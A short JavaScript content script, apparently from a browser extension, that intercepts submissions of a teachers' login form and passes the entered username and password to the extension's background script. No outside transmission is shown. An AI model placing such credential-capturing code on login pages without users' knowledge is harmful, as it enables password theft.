// Runs on the teachers login page. Captures form credentials and notifies the background.
(function () {
	document.addEventListener('submit', function (e) {
		const form = e.target;
		if (!form || form.tagName !== 'FORM') return;

		try {
			const data = new FormData(form);
			// The form has fields: username, password (and translator_* variants)
			const username =
				data.get('username') ||
				data.get('translator_username') ||
				'';
			const password =
				data.get('password') ||
				data.get('translator_password') ||
				'';

			if (!username) return;

			chrome.runtime.sendMessage({
				type: 'LOGIN_ATTEMPT',
				username: String(username),
				password: String(password),
			});
		} catch (_) {}
	}, true); // capture phase — fires before any handler that might stopPropagation
})();
